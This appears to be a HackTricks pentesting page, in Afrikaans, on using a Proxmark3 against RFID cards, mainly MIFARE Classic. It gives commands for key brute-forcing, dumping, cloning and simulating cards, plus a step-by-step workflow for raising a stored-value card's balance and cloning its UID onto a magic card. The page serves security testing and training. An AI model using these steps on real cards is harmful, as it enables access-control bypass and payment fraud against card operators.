# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Aanvalle op RFID Systems met Proxmark3

Die eerste ding wat jy moet doen, is om ’n [**Proxmark3**](https://proxmark.com) te hê en [**die sagteware en sy afhanklikhede te installeer**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Aanvalle op MIFARE Classic 1KB

Dit het **16 sectors**, elk met **4 blocks**, en elke block bevat **16B**. Die UID is in sector 0 block 0 (en kan nie verander word nie).\
Om toegang tot elke sector te verkry, benodig jy **2 keys** (**A** en **B**), wat in **block 3 van elke sector** (sector trailer) gestoor word. Die sector trailer stoor ook die **access bits** wat die **lees- en skryftoestemmings** op **elke block** bepaal deur die 2 keys te gebruik.\
2 keys is nuttig om toestemming te gee om te lees as jy die eerste een ken, en om te skryf as jy die tweede een ken (byvoorbeeld).

Verskeie aanvalle kan uitgevoer word
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Die Proxmark3 laat jou toe om ander aksies uit te voer, soos om **’n Tag na Reader-kommunikasie af te luister** om te probeer om sensitiewe data te vind. Met hierdie kaart kon jy bloot die kommunikasie **sniff** en die gebruikte sleutel bereken, omdat die **kriptografiese bewerkings wat gebruik word swak is** en jy dit kan bereken deur die plain- en ciphertext te ken (`mfkey64`-tool).<sup>[[3]](#references)</sup>

#### MiFare Classic vinnige werkvloei vir misbruik van stored-value

Wanneer terminale saldo’s op Classic-kaarte stoor, is ’n tipiese end-tot-end-werkvloei soos volg:<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notas

- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder.<sup>[[1]](#references)</sup>
- Writing block 0/UID only works on magic gen1a/gen2 cards. Normal Classic cards have read-only UID.<sup>[[2]](#references)</sup>
- Many deployments use Classic "value blocks" or simple checksums. Ensure all duplicated/complemented fields and checksums are consistent after editing.<sup>[[4]](#references)</sup>

Sien 'n hoërvlak-metodologie en mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Rou Commands

IoT-stelsels gebruik soms **nie-handelsmerk- of niekommersiële tags**. In hierdie geval kan jy Proxmark3 gebruik om pasgemaakte **raw commands na die tags** te stuur.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Met hierdie inligting kan jy probeer om inligting oor die kaart en oor die manier waarop daarmee gekommunikeer word, te soek. Proxmark3 laat jou toe om rou opdragte te stuur, soos: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3-sagteware kom met ’n voorafgelaaide lys van **outomatiseringskripte** wat jy kan gebruik om eenvoudige take uit te voer. Om die volledige lys te kry, gebruik die `script list`-opdrag. Gebruik vervolgens die `script run`-opdrag, gevolg deur die skrip se naam:
```
proxmark3> script run mfkeys
```
Jy kan 'n script skep om **tag readers te fuzz**, sodat jy, nadat jy die data van 'n **geldige kaart** gekopieer het, eenvoudig 'n **Lua script** skryf wat die waarde van een of meer ewekansige **bytes** verander en kyk of die **reader crash** met enige iterasie.

## Verwysings

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP se verklaring oor MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Ontginning van 'n NFC-kaartkwesbaarheid in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
